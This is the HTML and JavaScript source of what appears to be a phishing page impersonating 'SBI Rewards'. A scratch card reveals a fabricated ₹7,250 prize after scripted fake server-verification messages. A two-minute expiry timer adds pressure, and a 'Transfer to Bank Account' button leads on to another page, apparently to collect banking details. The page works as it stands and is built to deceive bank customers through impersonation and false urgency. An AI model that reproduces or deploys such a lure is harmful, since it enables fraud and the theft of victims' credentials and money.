<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI Rewards - Win</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, sans-serif; }
        body { background-color:#f4f7f9; text-align: center; }
        .full-img { width: 100%; display: block; border-bottom: 1px solid #ddd; }

        .container { padding: 30px 15px; }
        h2 { color: #003366; font-size: 19px; margin-bottom: 10px; }
        
        /* Scratch Area */
        #scratch-widget {
            position: relative; width: 280px; height: 280px;
            margin: 0 auto; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            background: #fff; overflow: hidden; border: 4px solid #fff;
        }
        #scratch-canvas { position: absolute; top: 0; left: 0; z-index: 5; cursor: crosshair; touch-action: none; }

        /* Modal Popup */
        .modal-overlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.85); justify-content: center; align-items: center; 
            z-index: 10000; padding: 20px;
        }
        .modal-box { 
            background: white; padding: 25px 20px; border-radius: 15px; 
            width: 100%; max-width: 320px; text-align: center; border-top: 6px solid #007bb5;
        }

        /* Spinner */
        .spinner { 
            width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #007bb5; 
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Sleek Amount Box */
        .amount-box { 
            display: none; font-size: 38px; font-weight: 800; color: #007bb5; 
            background: #f0f7ff; padding: 10px; border-radius: 8px; 
            border: 1.5px dashed #007bb5; margin: 15px 0; 
        }
        
        .status-txt { font-size: 13px; color: #666; font-weight: 600; }

        /* Red Expire Timer */
        #expire-timer { display: none; color: #d32f2f; font-size: 13px; font-weight: 700; margin-top: 5px; }

        .btn-transfer {
            display: none; width: 100%; padding: 15px; background: #007bb5;
            color: white; border: none; border-radius: 6px;
            font-size: 15px; font-weight: 700; cursor: pointer;
            text-transform: uppercase; margin-top: 15px;
        }

        .footer { width: 100%; margin-top: 40px; padding: 0 15px 30px; }
    </style>
</head>
<body>

    <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="full-img">

    <div class="container">
        <h2>Exclusive Reward Found!</h2>
        <p style="color:#666; font-size:14px; margin-bottom:20px;">Scratch the card to claim your prize.</p>
        <div id="scratch-widget">
            <canvas id="scratch-canvas" width="280" height="280"></canvas>
            <div style="height:100%; display:flex; align-items:center; justify-content:center; background:#f9f9f9; color:#ccc;">Revealing...</div>
        </div>
    </div>

    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" class="footer">

    <div class="modal-overlay" id="rewardPopup">
        <div class="modal-box">
            <h3 id="popTitle" style="color:#444; margin-bottom:12px; font-size: 18px;">Verifying Claim...</h3>
            
            <div id="proc-ui">
                <div class="spinner"></div>
                <p class="status-txt" id="statusMsg">Connecting to SBI Rewards Server...</p>
            </div>

            <div class="amount-box" id="amtBox">7000</div>

            <div id="expire-timer">Offer expires in: <span id="timer-clock">02:00</span></div>

            <button class="btn-transfer" id="finalBtn" onclick="window.location.href='mypages.html'">Transfer to Bank Account</button>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('scratch-canvas');
        const ctx = canvas.getContext('2d');
        let isDrawing = false, isFinished = false;

        function init() {
            ctx.fillStyle = '#b0bec5'; ctx.fillRect(0,0,280,280);
            ctx.fillStyle = '#fff'; ctx.font = 'bold 22px Arial'; ctx.textAlign = 'center';
            ctx.fillText('SCRATCH HERE', 140, 145);
        }

        function scratch(e) {
            if (isFinished) return;
            const rect = canvas.getBoundingClientRect();
            const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
            const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
            ctx.globalCompositeOperation = 'destination-out';
            ctx.beginPath(); ctx.arc(x, y, 30, 0, Math.PI*2); ctx.fill();
            check();
        }

        function check() {
            const pix = ctx.getImageData(0,0,280,280).data;
            let trans = 0;
            for(let i=0; i<pix.length; i+=4) { if(pix[i+3] === 0) trans++; }
            if(trans > (pix.length/4)*0.45) {
                isFinished = true; canvas.style.display='none';
                startFlow();
            }
        }

        function startFlow() {
            document.getElementById('rewardPopup').style.display = 'flex';
            const status = document.getElementById('statusMsg');
            
            setTimeout(() => status.innerText = "Authenticating Rewards Profile...", 3000);
            setTimeout(() => status.innerText = "Finalizing Eligible Amount...", 7000);

            setTimeout(() => {
                document.getElementById('proc-ui').style.display = 'none';
                document.getElementById('amtBox').style.display = 'block';
                document.getElementById('popTitle').innerText = "Calculating Reward...";
                spinAmount();
            }, 10000);
        }

        function spinAmount() {
            const amtBox = document.getElementById('amtBox');
            let start = Date.now();
            let duration = 4000; 
            
            const timer = setInterval(() => {
                let elapsed = Date.now() - start;
                if(elapsed < duration) {
                    amtBox.innerText = Math.floor(Math.random() * (7500 - 7000 + 1)) + 7000;
                } else {
                    clearInterval(timer);
                    amtBox.innerText = "₹7,250";
                    showFinal();
                }
            }, 70);
        }

        function showFinal() {
            document.getElementById('popTitle').innerText = "Congratulations!";
            document.getElementById('popTitle').style.color = "#2ecc71";
            document.getElementById('finalBtn').style.display = "block";
            document.getElementById('expire-timer').style.display = "block";
            startTimer(120); // 2 minute countdown
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            const display = document.getElementById('timer-clock');
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.textContent = minutes + ":" + seconds;
                if (--timer < 0) timer = 0;
            }, 1000);
        }

        canvas.addEventListener('mousedown', () => isDrawing = true);
        canvas.addEventListener('touchstart', () => isDrawing = true);
        window.addEventListener('mouseup', () => isDrawing = false);
        window.addEventListener('touchend', () => isDrawing = false);
        canvas.addEventListener('mousemove', (e) => isDrawing && scratch(e));
        canvas.addEventListener('touchmove', (e) => isDrawing && scratch(e));
        init();
    </script>
</body>
</html>
